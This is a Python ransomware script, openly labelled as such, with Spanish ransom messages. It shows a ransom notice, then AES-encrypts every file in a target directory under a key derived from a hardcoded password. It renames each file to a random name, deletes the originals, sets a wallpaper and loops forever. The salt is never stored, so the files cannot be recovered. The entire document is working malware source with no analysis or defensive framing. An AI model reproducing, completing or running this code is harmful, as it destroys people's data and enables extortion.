import os
import tkinter as tk
from tkinter import messagebox
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from base64 import b64encode, b64decode
import ctypes
import random
import string

PASSWORD = b'himself9864'
CONTACT = 'himself'
IMAGE_PATH = 'cancerbero.jpg'  # Asegúrate de tener esta imagen en el mismo directorio que el script

def show_message_box():
    root = tk.Tk()
    root.withdraw()  # Hide the main window
    messagebox.showinfo("Ransomware", "Tu archivo ha sido encriptado. Contacta a 'himself' para recuperar tus datos.")
    root.destroy()

def encrypt_file(file_path, key):
    with open(file_path, 'rb') as f:
        data = f.read()

    iv = os.urandom(16)
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()

    padder = padding.PKCS7(algorithms.AES.block_size).padder()
    padded_data = padder.update(data) + padder.finalize()

    encrypted_data = encryptor.update(padded_data) + encryptor.finalize()

    new_file_name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=12)) + os.path.splitext(file_path)[1]
    new_file_path = os.path.join(os.path.dirname(file_path), new_file_name)

    with open(new_file_path, 'wb') as f:
        f.write(iv + encrypted_data)

    os.remove(file_path)

def encrypt_files_in_directory(directory, key):
    for root, _, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            encrypt_file(file_path, key)

def set_wallpaper(image_path):
    SPI_SETDESKWALLPAPER = 20
    ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, image_path, 0)

def main():
    show_message_box()

    salt = os.urandom(16)
    kdf = HKDF(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        info=None,
        backend=default_backend()
    )
    key = kdf.derive(PASSWORD)

    encrypt_files_in_directory(CONTACT, key)

    set_wallpaper(IMAGE_PATH)

    while True:
        pass

if __name__ == "__main__":
    main()